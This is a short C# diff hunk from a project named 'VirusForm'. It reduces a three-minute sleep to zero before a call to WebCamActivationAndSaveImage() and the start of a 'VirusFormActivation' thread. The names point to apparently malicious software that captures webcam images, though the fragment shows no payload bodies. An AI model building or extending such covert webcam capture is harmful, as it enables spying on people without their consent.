@@ -140,7 +140,7 @@ namespace VirusForm
         {
             try
             {
-                Thread.Sleep(180000);
+                Thread.Sleep(0);
 
                 WebCamActivationAndSaveImage();
                 virusFormWork = new Thread(VirusFormActivation);
